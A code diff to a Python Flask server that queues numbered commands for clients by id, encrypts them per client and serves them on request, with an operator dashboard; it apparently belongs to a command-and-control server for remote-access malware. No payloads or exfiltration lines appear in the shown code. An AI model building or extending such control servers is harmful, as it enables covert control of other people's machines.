@@ -37,11 +37,6 @@ class Command:
     def __init__(self, command_code, label, arg=None):
         self.command_code = command_code
         self.label = label
-        self.label_value = str(command_code)
-
-        if arg:
-            self.label_value += f'_{arg}'
-
         self.arg = arg
 
     def get_payload(self):
@@ -111,37 +106,45 @@ def provide_command():
     client_id = request.args.get('id')
     client = clients.get(client_id)
     print_debug(client_id)
-    data = client.current_task.get_payload()
-    print_debug(data)
-    data = encrypt(data, clients[client_id].key)
-    print_debug(data)
-    return data
+    if client.current_task:
+        data = client.current_task.get_payload()
+        print_debug(data)
+        data = encrypt(data, clients[client_id].key)
+        print_debug(data)
+
+        return data
+
+    else:
+        return 'No command'
 
 
-@app.route('/control_centre', methods=['GET', 'POST'])
+@app.route('/', methods=['GET', 'POST'])
 def control_centre():
 
-    if request.method == 'POST':
-        # get command to run from control centre here
-        command_arg_pair = request.form.get('command').split('_')
+    task_count = 0
 
-        if len(command_arg_pair) == 2:
-            command_code, arg = command_arg_pair
-        else:
-            command_code = command_arg_pair[0]
-            arg = None
+    for client in clients.values():
+        if client.current_task:
+            task_count += 1
 
+    return render_template('index.html', clients=clients.items(), commands=commands, task_count=task_count)
+
+
+# used to contril individual clients
+@app.route('/client', methods=['GET'])
+def control_client():
+
+    client_id = request.args.get('id')
+    command_code = request.args.get('cmd')
+
+    if command_code:
         command_code = int(command_code)
+        command_arg = request.args.get('arg')
+        print(command_code)
+        print(command_arg)
+        command = lookup_command(command_code, command_arg)
 
-        target_id = request.form.get('target')
-        print_debug(f'Command for {target_id}: {command_code}')
+        client = clients.get(client_id)
+        client.current_task = command
 
-        target = clients.get(target_id)
-
-        if not target:
-            return render_template_string('PageNotFound {{ errorCode }}', errorCode='404'), 404
-
-        command = lookup_command(command_code, arg)
-        target.current_task = command
-
-    return render_template('control_centre.html', clients=clients.items(), commands=commands)
+    return render_template('client.html', client_id=client_id, commands=commands)
